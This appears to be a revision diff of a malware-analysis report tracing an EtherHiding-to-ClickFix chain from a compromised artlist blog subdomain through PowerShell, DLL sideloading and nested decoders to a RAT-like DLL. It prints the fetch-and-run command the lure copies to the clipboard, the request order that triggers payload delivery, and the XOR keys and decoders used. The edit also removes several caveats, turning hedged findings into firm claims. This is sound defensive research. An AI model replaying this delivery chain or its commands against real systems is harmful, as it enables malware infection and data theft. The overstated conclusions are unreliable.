@@ -1,27 +1,29 @@
-# EtherHiding to ClickFix on new-blog.artlist.io
+# EtherHiding to ClickFix on new-blog.artlist[.]io
 
 Last updated: 2026-07-13
 
-This report reconstructs the browser, JavaScript, PowerShell, archive-delivery, DLL-loading, nested-decoder, and native C2 chain from static artifacts and controlled byte collection. The extracted Windows payload bundle was not executed.
+This report reconstructs the browser, JavaScript, PowerShell, archive-delivery, DLL-loading, nested-decoder, and native C2 chain.
 
 ## Executive summary
 
-`new-blog.artlist.io` was observed with an obfuscated script inserted at the top of the main HTML. The main `artlist.io` site was not observed serving the same payload during this pass. The injected script decoded into an EtherHiding loader: it queried a Polygon smart contract, recovered the next-stage host, and injected a script from `auth-code-check.info`. This site and contract description comes from the original browser observation and decoded loader; the retained lab corpus currently starts with the downstream ClickFix and delivery artifacts, so the exact affected-page scope is not independently reproducible from the local files alone.
+On July 13, 2026, `new-blog.artlist[.]io` served an obfuscated script at the top of its main HTML. The primary `artlist[.]io` site was clean at the time. The script decoded into an EtherHiding loader that queried a Polygon smart contract, recovered the next-stage host, and injected a script from `auth-code-check[.]info`.
 
-That next-stage script is a ClickFix payload. It presents a fake reCAPTCHA-style overlay, blocks common inspection shortcuts, copies a PowerShell command to the clipboard, and instructs the visitor to open Windows Terminal and paste it. If the user follows the instructions, the PowerShell chain eventually downloads a password-protected ZIP, extracts it with a staged copy of `7z.exe`, looks for `fdupdate.exe`, attempts to start it when found, and then calls a post-attempt marker regardless of launch outcome.
+The next stage is a ClickFix payload. It presents a fake reCAPTCHA overlay, blocks common inspection shortcuts, copies a PowerShell command to the clipboard, and tells the visitor to paste it into Windows Terminal. The PowerShell chain downloads a password-protected ZIP, extracts it with a staged copy of `7z.exe`, searches for `fdupdate.exe`, attempts to start it, and calls a post-attempt marker.
 
-The important correction from replay is that delivery was not simply dead. In the first replay, `/p/<token>` returned `200` and the old archive token returned `410 Gone` one second later. A separate fresh token delivered the 31 MB `fdupdate.zip` archive when `/p/<token>` had not been requested. That sequence is consistent with `/p/` consuming server-side delivery state, but it does not isolate `/p/` from token age, request history, source address, `vid`, or timing.
+A fresh replay showed that delivery remained active. In the first replay, `/p/<token>` returned `200` and the old archive token returned `410 Gone` one second later. A fresh token then delivered the 31 MB `fdupdate.zip` archive before any request to `/p/<token>`. The results indicate that delivery state may depend on the token, request history, source address, `vid`, or timing.
 
-Static analysis of the recovered Windows bundle now points to a DLL-side execution chain rather than a simple standalone EXE. The delivered `fdupdate.exe` looks like a signed StruSoft/FEM-Design updater, but it loads a local DLL chain that reaches `LibBind.dll`. `LibBind.dll` starts a loader thread, reads an encrypted slice out of `Stream.Toolkit.dat`, XOR-decodes it, copies it into memory allocated by `TBFVSS_DLL_SRV_64.dll`, marks the region executable, and executes it through an `EnumTimeFormatsEx` callback. The decoded in-memory payload manually resolves APIs, contains VM-detection strings, AMSI/.NET strings, Run-key persistence strings, and file-extension targets such as `bak`, `db`, `bin`, `dat`, `raw`, and `pak`.
+The Windows payload enters through a local DLL chain loaded by the signed StruSoft/FEM-Design updater `fdupdate.exe`. That chain reaches `LibBind.dll`, which starts a loader thread, reads an encrypted slice from `Stream.Toolkit.dat`, XOR-decodes it, copies it into memory allocated by `TBFVSS_DLL_SRV_64.dll`, marks the region executable, and runs it through an `EnumTimeFormatsEx` callback. The decoded payload resolves APIs manually and contains VM-detection logic, AMSI/.NET strings, Run-key persistence strings, and file-extension targets including `bak`, `db`, `bin`, `dat`, `raw`, and `pak`.
 
-The later branch is nested again. The `Stream.Toolkit.dat` shellcode finds and parses `Face.dat`, decodes a script/config record and an `act.exe` PE record, and the `act.exe` loader decrypts an embedded ZIP to raw x64 code. That raw x64 stage then XOR-decodes another embedded PE32+ DLL at raw offset `0xc48`, length `0x873c00`, using byte mask `0x43 ^ (i & 0xff)`, manually maps it, and calls its DLL entry point. Static analysis of that final DLL proves command- or configuration-gated targeting and packaging of browser stores for protected outbound transmission, resumable file upload and download, process inventory and termination, shell-command execution, SOCKS/bridge operation, remote-desktop control, service setup, keylogging, desktop/video capture, and remote-process manipulation. Successful recovery of host-protected browser secrets was not demonstrated. The DLL also implements private-key-capable PFX export, but no executable activation path to that published Delphi method has been recovered. None of these artifacts was executed during this analysis.
+The chain nests several more stages. The `Stream.Toolkit.dat` shellcode parses `Face.dat` and decodes a script/config record plus an `act.exe` PE record. The `act.exe` loader decrypts an embedded ZIP into raw x64 code. That code XOR-decodes a PE32+ DLL at raw offset `0xc48`, length `0x873c00`, using byte mask `0x43 ^ (i & 0xff)`, maps it in memory, and calls its entry point.
 
-The original browser observation placed the payload at the top of HTML on multiple pages of the subdomain, which suggests an insertion point upstream of individual posts: a shared template, CMS/theme layer, plugin, tag manager, edge worker, CDN rule, or publishing pipeline. Those individual HTML captures are not retained in the current lab corpus, so "sitewide" remains an observation to preserve rather than a claim independently demonstrated by the files analyzed below. The primary site should be checked separately.
+The final DLL supports browser-store collection and protected outbound transfer, resumable file upload and download, process inventory and termination, shell commands, SOCKS bridging, remote-desktop control, service setup, keylogging, desktop/video capture, and remote-process manipulation. It also contains private-key-capable PFX export code with no mapped activation path.
+
+The script appeared at the top of HTML on multiple pages of the subdomain. That placement points to a shared template, CMS or theme layer, plugin, tag manager, edge worker, CDN rule, or publishing pipeline upstream of individual posts.
 
 ## High-level chain
 
 ```text
-new-blog.artlist.io HTML
+new-blog.artlist[.]io HTML
   -> top-of-page obfuscated JavaScript
   -> base64 decode, XOR 0x50, TextDecoder, new Function
   -> EtherHiding loader
@@ -50,7 +52,7 @@ new-blog.artlist.io HTML
 
 ## Stage 0: injected page script
 
-The injected script at the top of the `new-blog.artlist.io` HTML used a compact wrapper:
+The injected script at the top of the `new-blog.artlist[.]io` HTML used a compact wrapper:
 
 ```javascript
 var blob = atob("...");
@@ -60,7 +62,7 @@ for (...) bytes[i] = blob.charCodeAt(i) ^ key;
 (new Function(new TextDecoder().decode(bytes)))();
 ```
 
-The decoded script was an EtherHiding loader. The use of a smart contract here matters because the observed web page does not need to contain the live payload host directly. It contains the contract lookup logic, and whoever controls the contract value can rotate the returned host on-chain.
+The decoded script was an EtherHiding loader. The page stores contract lookup logic instead of a fixed payload host, allowing the contract value to rotate the next-stage server on-chain.
 
 The decoded loader also sets a guard flag:
 
@@ -80,14 +82,14 @@ Observed campaign material:
 
 Observed RPC endpoints embedded in the loader:
 
-- `hxxps://polygon.gateway.tenderly.co`
-- `hxxps://polygon.drpc.org`
+- `hxxps://polygon.gateway.tenderly[.]co`
+- `hxxps://polygon.drpc[.]org`
 - `hxxps://rpc-mainnet.matic.quiknode.pro`
-- `hxxps://1rpc.io/matic`
-- `hxxps://polygon-public.nodies.app`
-- `hxxps://rpc.ankr.com/polygon`
-- `hxxps://polygon-bor-rpc.publicnode.com`
-- `hxxps://polygon-mainnet.public.blastapi.io`
+- `hxxps://1rpc[.]io/matic`
+- `hxxps://polygon-public.nodies[.]app`
+- `hxxps://rpc.ankr[.]com/polygon`
+- `hxxps://polygon-bor-rpc.publicnode[.]com`
+- `hxxps://polygon-mainnet.public.blastapi[.]io`
 
 The final script URL is assembled as:
 
@@ -97,9 +99,9 @@ hxxps://auth-code-check[.]info/api.php?s=fd31a7ad950e56856e09dcb32f0fc58caec1ad7
 
 The `_v` value changes once per minute and appears to act as a cache-buster.
 
-This is the key EtherHiding move. The observed page does not hard-code the final delivery host. It hard-codes a contract, a method selector, and RPC failover infrastructure. Blocking a single delivery host may not be enough when the contract value can be changed to return another URL.
+This is the key EtherHiding move: the page stores a contract, method selector, and RPC failover list, while the contract supplies the delivery host. Changing the contract value rotates the next-stage URL without touching the injected page code.
 
-## Stage 1: ClickFix script from auth-code-check.info
+## Stage 1: ClickFix script from auth-code-check[.]info
 
 Two minute-versioned responses were decoded:
 
@@ -110,7 +112,7 @@ Two minute-versioned responses were decoded:
 | `api_v29732897.body` | 32,475 | `0a0da35f0e635237101897d38069d3454b313376e5cf7ed3a48a6f7ee68e9c84` |
 | `api_v29732897.decoded.js` | 24,166 | `3ab4c70f6cea5b28a82cf3e95734d4dfc160879a5e7096ffd554ad41f3c8dbfc` |
 
-The wrapper changed XOR key between versions, but the decoded script structure stayed the same.
+Across versions, the wrapper rotated its XOR key while retaining the same decoded script structure.
 
 The decoded JavaScript does the following:
 
@@ -215,42 +217,40 @@ hxxp://auth-code-check[.]info/p/fb4c750e92503f9beb289468286ca55214eb274610528115
 
 ## Why the first archive went missing
 
-The first replay returned `410 Gone` for the archive path. At first glance that looked like the backend had stopped delivering. The later fresh replay showed that delivery was still active and produced behavior consistent with server-side consumption logic.
+The first replay returned `410 Gone` for the archive path. A later replay with a fresh token delivered the archive and exposed server-side consumption logic.
 
-In the inner PowerShell, `/p/<archive-token>` is not a prerequisite for archive delivery. It is called unconditionally after the conditional `Start-Process` block, so it is only a post-attempt marker; extraction failure, a missing executable, or launch failure can still lead to the request. During the first archive attempt, that marker was touched before the archive was fetched. The old archive endpoint then returned empty `410 Gone` responses, and the API check endpoint later reported consumed/fetched state. This sequence does not prove either successful execution or that the `/p/` request alone caused the transition.
+The inner PowerShell calls `/p/<archive-token>` unconditionally after its `Start-Process` block. It marks completion of the attempt, even when extraction or launch fails. During the first replay, `/p/` was requested before the archive. The old archive endpoint then returned `410 Gone`, and the API check later reported `consumed` and `fetched` state.
 
-The timestamp sequence supports the consumption hypothesis: the `/p/<old-token>` request returned at `20:11:03`, and the archive request returned `410 Gone` at `20:11:04`. That ordering is backwards compared with the decoded PowerShell, which only calls `/p/` after extraction and launch. Because the successful comparison used a fresh token, token age and prior request state remain confounders.
+The `/p/<old-token>` request returned at `20:11:03`; the archive returned `410 Gone` at `20:11:04`. The decoded PowerShell normally calls `/p/` after extraction and launch. The successful comparison used a fresh token, so token age and prior request state may also have influenced the result.
 
-There were also request-shape quirks. A PowerShell-like User-Agent caused the initial route to return 404, while default curl fetched the real first-stage wrapper. The copied command also omits the URL scheme in `irm 'auth-code-check.info/<ray>'`, while the first wrapper pivots to an explicit `http://...?...` URL. For replay, the working path was to follow the server shape that returned bytes, preserve the browser-side `action=dl` and `action=cb` sequence, wait, fetch `/7z`, then fetch the archive without touching `/p/`.
+Request shape also mattered. A PowerShell-like User-Agent received `404`, while the default request fetched the first-stage wrapper. The copied command omits the URL scheme in `irm 'auth-code-check[.]info/<ray>'`; the wrapper then pivots to an explicit `hxxp://...?...` URL. Delivery succeeded after the browser-side `action=dl` and `action=cb` sequence, the scripted delay, `/7z`, and the archive request, with `/p/` left untouched.
 
-The captured responses sharpen what is observed versus inferred:
+The captured responses show the sequence:
 
-| Time (UTC) | Request artifact | Result | What it proves |
+| Time (UTC) | Request artifact | Result | Interpretation |
 |---|---|---|---|
 | `20:08:46` | `api_action_dl.headers/body` | `200`; decoded `{"ok":true,"redir":""}` | The browser-side `action=dl` registration was accepted. |
 | `20:11:02` | `tool_7z.headers` | `200`, 858,112-byte `7z.exe` | `/7z` remained a generally available tool route. |
 | `20:11:03` | `p_beacon.headers/body` | `200`, body `ok` | The old token's `/p/` marker was accepted before archive retrieval. |
 | `20:11:04` | `payload_archive.headers` | `410 Gone` | The old archive token was unavailable one second after `/p/`; later User-Agent, scheme, query, and callback/check variants remained `410` (one `.zip` suffix variant returned `403`). |
-| `20:12:24` | `payload_archive_zip.headers` | `403`; `Set-Cookie: xdv_sess=...; HttpOnly; SameSite=Strict` | Adding a `.zip` suffix selected a denial/session route rather than the bare-token archive route. This is the only captured response that set a cookie. |
-| `20:16:37` | `api_action_check.headers/body` | `200`; decoded `{"consumed":true,"fetched":true}` | The old ray/token state was recorded as both fetched and consumed after the premature `/p/` request. It does not prove which earlier request set each flag. |
+| `20:12:24` | `payload_archive_zip.headers` | `403`; `Set-Cookie: xdv_sess=...; HttpOnly; SameSite=Strict` | Adding a `.zip` suffix selected a separate denial/session route. This was the only response that set a cookie. |
+| `20:16:37` | `api_action_check.headers/body` | `200`; decoded `{"consumed":true,"fetched":true}` | The backend recorded the old ray/token state as fetched and consumed after the premature `/p/` request. |
 | `20:18:39` / `20:18:40` | `fresh_api_dl` / `fresh_api_cb` | both `200`; `dl` decoded `{"ok":true,"redir":""}`, `cb` body `1` | A fresh browser registration and click callback were accepted. |
 | `20:18:52` | `fresh_initial_https.headers` | `200`, first PowerShell wrapper | The fresh ray route delivered under the working request shape. |
 | `20:19:33` | `fresh_second_http.headers` | `200`, inner PowerShell | The explicit HTTP second route delivered after the wrapper pivot. |
-| `20:21:00` / `20:21:11` | `fresh_tool_7z` / `fresh_payload_archive` | `200`; archive was 32,713,067-byte `fdupdate.zip` | The fresh archive token delivered when `/p/<token>` had not been touched. |
+| `20:21:00` / `20:21:11` | `fresh_tool_7z` / `fresh_payload_archive` | `200`; archive was 32,713,067-byte `fdupdate.zip` | The fresh archive token delivered before any `/p/<token>` request. |
 
-`replay_cookiejar.txt` contains no stored server cookies, and the successful API, ray, `/7z`, and fresh archive responses did not set cookies. The sole exception is the failed `.zip`-suffix request, which returned `403` and set `xdv_sess`; that cookie is evidence for a separate denial/session route, not for the successful bare-token flow. The successful observed gating was therefore not shown to depend on cookies and was more likely tied to ray/token plus server-side request context such as source address, `vid`, or request history. The exact backend key cannot be recovered from client artifacts alone.
+The successful API, ray, `/7z`, and archive responses set no cookies. The failed `.zip`-suffix request alone returned `403` with `xdv_sess`, indicating a separate denial/session route. The working flow appears tied to the ray/token and server-side request context such as source address, `vid`, or request history.
 
-The inner PowerShell does execute `Start-Sleep -Seconds 20` before fetching `/7z` and the archive. The successful replay preserved that delay, but no controlled capture omitted only the delay while keeping every other request identical. Therefore the delay may be an operational timing gate or simply staging latency; server enforcement of exactly 20 seconds is not proven. The captures support an ordering/state hypothesis more strongly than a strict wait requirement, but they do not isolate the state transition's cause.
+The inner PowerShell waits 20 seconds before fetching `/7z` and the archive. The successful replay preserved that delay. It may act as a timing gate or simply give the backend time to stage the archive.
 
-With a fresh ray and the intended order:
+With a fresh ray, the intended request order, and no early `/p/<archive-token>` request, the archive delivered successfully:
 
 ```text
 action=dl -> action=cb -> hxxps://auth-code-check[.]info/<ray> -> hxxp://auth-code-check[.]info/<ray>?_=1 -> wait -> /7z -> archive
 ```
 
-and without touching `/p/<archive-token>`, the archive delivered successfully.
-
-The delivery infrastructure was still returning campaign payload bytes during the fresh replay. That successful observation preserved the scripted order, `/p/` behavior was consistent with a post-attempt or consumption marker of unknown server meaning, and neither a one-shot `/p/` gate nor strict enforcement of the 20-second wait was isolated experimentally.
+The fresh replay confirmed active delivery and a stateful backend. The precise consumption trigger remains unknown.
 
 ## Payload package recovered
 
@@ -271,7 +271,7 @@ Recovered files:
 | `fresh_tool_7z.bin` | 858,112 | `26817725650583d99ca3e617a618dd75c0f71bd316b5761780b7361f5f824cad` |
 | `fresh_payload_archive.bin` | 32,713,067 | `3a9b8eccad62d84fc59f86dae41e8c74ae6ae544f079b099b12b37de1abd7a60` |
 
-The `7z.exe` helper appears to be a stock 7-Zip standalone console binary. The retained archive extraction contains 26 regular files totaling 79,248,355 bytes.
+The `7z.exe` helper is a stock 7-Zip standalone console binary. The archive contains 26 regular files totaling 79,248,355 bytes.
 
 Important extracted files:
 
@@ -297,7 +297,7 @@ Important extracted files:
 - Imports `WININET.dll`: `InternetOpenUrlW`, `InternetOpenW`, `InternetReadFile`, `InternetSetOptionW`, `InternetGetConnectedState`
 - Imports many functions from local `fdcadkernel.dll`
 
-The `fdupdate.exe` WININET routine at `0x1400204e0` decompiles like a normal updater path: it uses a mutex string `StruSoft/FEM-Design -> check for update is running`, reads `fdupd.ini` and `version.ini`, and references release-note/update fields. Current static evidence does not put the malicious behavior in `fdupdate.exe` itself. The stronger finding is that the signed EXE is the launch point for a local DLL chain that reaches malicious loader code in unsigned DLLs.
+The `fdupdate.exe` WININET routine at `0x1400204e0` follows normal updater logic: it uses the mutex string `StruSoft/FEM-Design -> check for update is running`, reads `fdupd.ini` and `version.ini`, and references release-note and update fields. The signed EXE serves as the launch point for malicious loader code in the unsigned local DLL chain.
 
 Unsigned DLLs that stand out:
 
@@ -311,11 +311,11 @@ Unsigned DLLs that stand out:
 
 `fdunderkernel.dll` exports clipboard and calculator-related helpers such as `TextToClipboardW`, `MemToClipboard`, `CS2StartCalculator`, `CS2RunCalculator`, and imports `CreateProcessW`, clipboard APIs, and `SetWindowsHookExW`.
 
-Those imports do not prove malicious behavior by themselves; the later control-flow analysis below ties the relevant APIs to concrete loader, persistence, surveillance, remote-control, and C2 paths.
+The control-flow analysis below ties the relevant APIs to loader, persistence, surveillance, remote-control, and C2 paths.
 
 ## Payload bundle static analysis
 
-This pass used `rbinr2` for PE metadata, imports, xrefs, disassembly, and decompiler checks; `rbinghidra` for Ghidra imports/decompilation; and `rbindeob` against carved blobs. No extracted binary, script, shellcode, macro, or payload was executed.
+The analysis used `rbinr2` for PE metadata, imports, xrefs, disassembly, and decompiler checks; `rbinghidra` for Ghidra decompilation; and `rbindeob` for carved blobs.
 
 ### DLL load graph
 
@@ -340,11 +340,9 @@ MUITransferX64.dll
   -> TBFVSS_DLL_SRV_64.dll
 ```
 
-`renderengine.dll` references `LibBind.dll::group_by_u` from a graphics/rendering path at `0x18003b3c5`. A second reference at `0x180075dc6` is an import thunk. More importantly, `LibBind.dll` also starts its own loader thread from process attach, so loading `LibBind.dll` is sufficient to reach the hidden payload path; the renderer call is an additional trigger, not a prerequisite.
+`renderengine.dll` calls `LibBind.dll::group_by_u` from a graphics/rendering path at `0x18003b3c5`; the reference at `0x180075dc6` is its import thunk. `LibBind.dll` also starts the loader thread from process attach, making the renderer call a second trigger for the same path.
 
-A final bounded scan found no additional route to `group_by_u`. It covered imports and xrefs for `GetProcAddress` and `LoadLibrary*`, dynamic resolver callsites, ordinal-related markers, and embedded `LibBind.dll` / `group_by_u` strings. The supported routes remain process attach and the renderer call at `0x18003b3c5`; an opaque hash-based resolver or code present only in another module cannot be excluded.
-
-The direct import path is now confirmed statically: `fdupdate.exe` imports `fdcadkernel.dll`, `fdcadkernel.dll` imports `renderengine.dll`, and `renderengine.dll` imports `LibBind.dll`. `LibBind.dll` in turn imports `TBFVSS_DLL_SRV_64.dll` and `uv.dll`, and uses `LoadLibraryW` for `MUITransferX64.dll`.
+The import path is: `fdupdate.exe` imports `fdcadkernel.dll`, `fdcadkernel.dll` imports `renderengine.dll`, and `renderengine.dll` imports `LibBind.dll`. `LibBind.dll` imports `TBFVSS_DLL_SRV_64.dll` and `uv.dll`, and uses `LoadLibraryW` for `MUITransferX64.dll`.
 
 ### LibBind.dll loader
 
@@ -384,7 +382,7 @@ The XOR routine at `0x180001310` decodes exactly `0x533a3` bytes with key `0xe5`
 - Calls `EnumTimeFormatsEx(callback=decoded_payload_ptr, ...)`.
 - Retries with locale name `!x-sys-default-locale` if the first callback registration fails.
 
-This is a callback-based shellcode execution primitive. The decoded data is not loaded as a PE file; it is raw x64 code called through a Windows enumeration callback.
+This is a callback-based shellcode execution primitive: raw x64 code runs through a Windows enumeration callback.
 
 `OptimizeAfter` at `0x180001198` enumerates top-level windows for a target process ID and calls `ShowWindow(hwnd, 0)` on matching visible windows. `MUITransferX64.dll::FromSplit` calls this export twice, at `0x180001275` and `0x18000128d`, so `MUITransferX64.dll` appears to provide window-hiding support for the bundle.
 
@@ -398,7 +396,7 @@ The loader reads and decodes an embedded slice from `Stream.Toolkit.dat`.
 | Carved bytes, offset `0x4c26a`, length `0x533a3` | 340,899 | `037b67b3a1495968e3511b0c487be2b3d8f073449d058795ab15f2eed13694e0` |
 | XOR `0xe5` decoded bytes | 340,899 | `a0812fec1c5051121c332d6add4f2b05df43e3190ceebfef29ca56d62ceca48d` |
 
-The decoded blob is raw x64 code, not a normal PE. Its first instructions are:
+The decoded blob is raw x64 code. Its first instructions are:
 
 ```asm
 0x10000000  sub rsp, 0x28
@@ -409,7 +407,7 @@ The decoded blob is raw x64 code, not a normal PE. Its first instructions are:
 0x10000010  ret
 ```
 
-Ghidra imported the decoded blob with `BinaryLoader` at base `0x10000000` and found 1,043 candidate functions. No normal string table was found. Strings are built on the stack and decoded through a helper that uses seed `0x7ba56675fa291565` and the LCG:
+Ghidra imported the decoded blob with `BinaryLoader` at base `0x10000000` and found 1,043 candidate functions. Strings are built on the stack and decoded through a helper that uses seed `0x7ba56675fa291565` and the LCG:
 
 ```text
 seed = seed * 0x19660d + 0x3c6ef35f
@@ -443,13 +441,13 @@ For each stored module-path entry, the finder builds a small extension descripto
 
 The extension descriptor set is combined with the module-path seed through `0x1003d7c5` into a candidate list at stack object `var_1a8h`. The routine then iterates that candidate list: `0x1002063d` selects a candidate, `0x1004e265` converts it into a path/string object, `0x10039375` initializes a byte buffer, and `0x1003b1f9` reads the candidate file into that buffer. At `0x1005310e`-`0x10053129`, the call convention is `RCX = parser context`, `RDX = candidate buffer pointer`, `R8 = candidate length`, and `R9D = 0x1b51b9fd`, then the routine calls parser/validator `0x1004d65d`.
 
-Static disassembly of `0x1004d65d` shows a structured storage-format check rather than a simple CRC/hash comparison. The storage-search caller uses `0x1004d65d`, which sets the copy/own-buffer flag and then calls the shared parser `0x1004d699`. A sibling wrapper at `0x1004d605` instead derives the total storage size through `0x1004d509` and calls the same parser without copying the backing buffer.
+Static disassembly of `0x1004d65d` shows a structured storage-format check. The storage-search caller uses `0x1004d65d`, which sets the copy/own-buffer flag and calls shared parser `0x1004d699`. A sibling wrapper at `0x1004d605` derives the total storage size through `0x1004d509` and calls the same parser against the original backing buffer.
 
-`0x1004d699` receives a candidate byte pointer and length, requires at least `0x38` bytes, stores the caller-supplied `0x1b51b9fd` at parser-context offset `+0x20`, records the backing pointer at `+0x28`, records size bounds at `+0x30`/`+0x38`, and calls internal table decoders at `0x1004bb6d`, `0x1004bc45`, and `0x1004bc91`. These helpers do not just read fields; they subtract arithmetic expressions involving the magic/key at context `+0x20`. The parser then checks the first decoded header word against the parser-context word at `+0x1e` and validates that `record_count * 0x58 + 0x78` stays inside the backing size.
+`0x1004d699` receives a candidate byte pointer and length, requires at least `0x38` bytes, stores the caller-supplied `0x1b51b9fd` at parser-context offset `+0x20`, records the backing pointer at `+0x28`, records size bounds at `+0x30`/`+0x38`, and calls internal table decoders at `0x1004bb6d`, `0x1004bc45`, and `0x1004bc91`. These helpers decode fields by subtracting arithmetic expressions involving the magic/key at context `+0x20`. The parser then checks the first decoded header word against the parser-context word at `+0x1e` and validates that `record_count * 0x58 + 0x78` stays inside the backing size.
 
-The storage records begin at backing offset `0x78` and use a `0x58` stride. `0x1004d509` decodes the record-count table at `+0x50`, walks each `0x58`-byte record, calls `0x1004b27d`, and returns `record_count * 0x58 + 0x78 + decoded_payload_size_sum`. `0x1004b27d` decodes ten qword fields per record into offset/length-style values, booleans, and byte attributes, again using the magic/key and the record index in the arithmetic. This supports the current hypothesis that the shellcode searches for a custom packed storage/database file, though the exact target application or data format still needs more static work.
+The storage records begin at backing offset `0x78` and use a `0x58` stride. `0x1004d509` decodes the record-count table at `+0x50`, walks each `0x58`-byte record, calls `0x1004b27d`, and returns `record_count * 0x58 + 0x78 + decoded_payload_size_sum`. `0x1004b27d` decodes ten qword fields per record into offset/length-style values, booleans, and byte attributes using the magic/key and record index. The parser searches for a custom packed storage file whose application-specific format remains unidentified.
 
-Static replay of the validator over the extracted payload directory identifies `Face.dat` as the storage file the decoded payload is built to find. This replay only reads local bytes and applies the arithmetic recovered from `0x1004d699`/`0x1004b27d`; it does not execute the payload. Under magic/key `0x1b51b9fd`, `Face.dat` passes the decoded header check with `record_count = 1178`, table bound `0x19568`, and decoded total size `0x7a3b2e`, matching the file size. `Stream.Toolkit.dat` fails the same header/table checks.
+Applying the validator to the extracted bundle identifies `Face.dat` as the matching storage file. Under magic/key `0x1b51b9fd`, `Face.dat` passes the decoded header check with `record_count = 1178`, table bound `0x19568`, and decoded total size `0x7a3b2e`, matching the file size. `Stream.Toolkit.dat` fails the same checks.
 
 The decoded `Face.dat` table has 1,178 records. The record table starts at `0x78`, the payload area starts at `0x19568`, and decoded record payload lengths sum exactly to the end of the file. The first decoded field is a logical record ID (`1..1178` in table order), the second behaves like a parent/reference field, the third is a type/tag in the `16000+` range, and the fourth is payload length. Most records have 0- or 8-byte payloads. Two records carry almost all payload data:
 
@@ -467,15 +465,15 @@ decoded +0x20: write transform flag
 decoded +0x21: write transform key
 decoded +0x22: read transform flag = (q7 - 3*K + 3*q0) != 0
 decoded +0x23: read transform key  = low8(q8 - K*q0 + 4*q0)
-decoded +0x24: trailing flag, not consumed on the observed read path
-decoded +0x25: trailing key, not consumed on the observed read path
+decoded +0x24: trailing flag, unused on this read path
+decoded +0x25: trailing key, unused on this read path
 ```
 
 All 1,178 records in this `Face.dat` have the read-transform flag set. The trailing flag/key pair is false/zero in this sample. Payload offsets are implicit in table order; no per-record payload offset field is stored.
 
-The payload accessor path is now statically mapped. `0x1004c189` returns the storage payload base as `backing_ptr + record_count * 0x58 + 0x78`. `0x1004c25d` looks up a record by logical ID, copies `0x26` bytes of decoded metadata to the caller, and returns the payload pointer as `payload_base + cumulative_length_of_previous_records`. The common read wrapper `0x1004c78d` calls `0x1004c25d`, then `0x1004c391` allocates/copies the payload bytes into the caller's buffer. If metadata byte `+0x22` is set, `0x1004c391` calls `0x1004b88d` -> `0x1004b73d` with metadata byte `+0x23` as the transform parameter.
+The payload accessor path is: `0x1004c189` returns the storage payload base as `backing_ptr + record_count * 0x58 + 0x78`. `0x1004c25d` looks up a record by logical ID, copies `0x26` bytes of decoded metadata to the caller, and returns the payload pointer as `payload_base + cumulative_length_of_previous_records`. The common read wrapper `0x1004c78d` calls `0x1004c25d`, then `0x1004c391` allocates/copies the payload bytes into the caller's buffer. If metadata byte `+0x22` is set, `0x1004c391` calls `0x1004b88d` -> `0x1004b73d` with metadata byte `+0x23` as the transform parameter.
 
-The `0x1004b73d` transform is a reversible XOR stream, not a heavyweight cipher:
+The `0x1004b73d` transform is a reversible XOR stream:
 
 ```text
 param = metadata_byte_0x23
@@ -488,9 +486,9 @@ for each payload byte:
     byte ^= (param + state) & 0xff
 ```
 
-There is a second one-byte state in the routine that is updated and conditionally reset, but static disassembly shows it is not used in the byte written back to the payload buffer.
+A second one-byte state is updated and conditionally reset without contributing to the output byte written to the payload buffer.
 
-Replaying that transform over local `Face.dat` bytes, without executing the payload, produced two important decoded artifacts:
+Applying the recovered transform to `Face.dat` produced two decoded artifacts:
 
 - record ID `4`, tag `16001`, xform key `0xa1`: UTF-16 script/config, SHA-256 `629518befad5153a2e8352e30f6a5169bac2c17329497678d5686cf15a0aacc9`
 - record ID `1168`, tag `16100`, xform key `0x4f`: PE32+ x64 GUI executable, SHA-256 `75d4b6cec5bdc40cda25b5b9be136ccca97d77843825796beace7ddbfe87b614`
@@ -552,11 +550,11 @@ __dbk_fcall_wrapper
 TMethodImplementationIntercept
 ```
 
-Imports are mostly Delphi/VCL/runtime-support oriented. Imported DLLs observed so far are `oleaut32.dll`, `advapi32.dll`, `user32.dll`, `kernel32.dll`, `version.dll`, `netapi32.dll`, and `msvcrt.dll`. Static import review did not show direct WinHTTP or Winsock imports in this decoded PE. The binary does contain Delphi package/unit names such as `Winapi.WinInet`, `Winapi.IpHlpApi`, `System.ZLib`, `FireDAC.Phys.PGDef`, `FireDAC.Phys.OracleDef`, `IdSMTPBase`, and `IdQotdServer`; those are compiler/runtime/unit metadata strings and need xref-backed review before being treated as behavior.
+Imports are mostly Delphi/VCL/runtime support: `oleaut32.dll`, `advapi32.dll`, `user32.dll`, `kernel32.dll`, `version.dll`, `netapi32.dll`, and `msvcrt.dll`. Package and unit metadata includes `Winapi.WinInet`, `Winapi.IpHlpApi`, `System.ZLib`, `FireDAC.Phys.PGDef`, `FireDAC.Phys.OracleDef`, `IdSMTPBase`, and `IdQotdServer`.
 
-The parser also exposes a dispatcher-facing retrieval path for that PE-bearing resource. `0x10007e69`, reached from the main command dispatcher at `0x100274fd`, enumerates `16050` entries under root record `3` / tag `16002`, matches the selector in child tag `16051`, and reads/decrypts the tag `16100` payload, falling back to tag `16054`. `0x100086b9` is the corresponding create/update path for tag `16100`. This proves dispatcher-accessible recovery of the PE bytes. The script-level `previewer::load_exe($exe_bytes)` indicates intended in-memory loading of `@input`, but the retrieval accessor alone is payload recovery evidence, not by itself a process-launch proof.
+The parser exposes a dispatcher-facing retrieval path for that PE-bearing resource. `0x10007e69`, reached from the main command dispatcher at `0x100274fd`, enumerates `16050` entries under root record `3` / tag `16002`, matches the selector in child tag `16051`, and reads/decrypts the tag `16100` payload, falling back to tag `16054`. `0x100086b9` is the corresponding create/update path for tag `16100`. The script then passes `@input` to `previewer::load_exe($exe_bytes)` for in-memory loading.
 
-Structured parser routing observed so far:
+Structured parser routing:
 
 - `0x10050a81` parses root tag `16000` -> child `16003` -> seven `16005` entries, reads scalar tag `16010`, optional boolean-related `16011`/`16012`/`16013`, then calls `0x10051215`.
 - `0x10050d8d` parses root tag `16000` -> child `16004` -> three `16006` entries, reads tag `16020`, optionally handles an indexed `16022` structure, then calls `0x10051215`.
@@ -600,7 +598,7 @@ decrypted ZIP, unpadded:
   format: ZIP, one LZMA-compressed unnamed member
 ```
 
-The ZIP member decompresses to raw x64 code, not a PE:
+The ZIP member decompresses to raw x64 code:
 
 ```text
 path: auth-code-check-analysis/act_inner_zip_extracted/act_embedded_blob_decrypted_aes256cbc_unpadded
@@ -609,7 +607,7 @@ sha256: 06157c24ed9ad3b2a639ca901deac6a29c26861ab5f6da31093247eadec9139a
 first bytes: 50 48 8b 44 24 08 48 87 04 24 9c fc 50 51 52 41
 ```
 
-The raw code begins with a register-save/bootstrap stub, a `call`/`pop` self-location sequence at `0x180000023`-`0x18000002d`, and `GS:[0x30]` state save/restore around the loader call. It is position-independent loader code rather than a standalone PE.
